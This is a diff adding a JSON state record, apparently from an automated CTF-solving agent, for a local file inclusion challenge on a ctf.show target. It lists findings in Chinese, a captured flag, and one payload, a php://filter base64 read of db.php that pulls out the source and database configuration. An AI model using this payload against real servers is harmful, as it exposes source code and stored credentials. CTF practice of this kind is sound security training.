@@ -1,0 +1,19 @@
+{
+  "target": "https://3e694bfb-c038-4100-9e78-954b9497209e.challenge.ctf.show/",
+  "type": "lfi",
+  "step": 0,
+  "findings": [
+    "db.php 包含数据库配置，flag 直接写在源码中",
+    "file_get_contents + include 组合，include 先执行导致 db.php 中的 PHP 代码被执行"
+  ],
+  "methods_tried": [
+    "php://filter/read=convert.base64-encode/resource=db.php"
+  ],
+  "failed_patterns": [],
+  "suggested_bypass": [],
+  "reasoning_chain": [],
+  "flag": "CTF{3ecret_passw0rd_here}",
+  "created_at": "2026-03-29T19:26:10.311711",
+  "updated_at": "2026-03-29T19:26:10.313264",
+  "payload_context": "php://filter/read=convert.base64-encode/resource=db.php"
+}
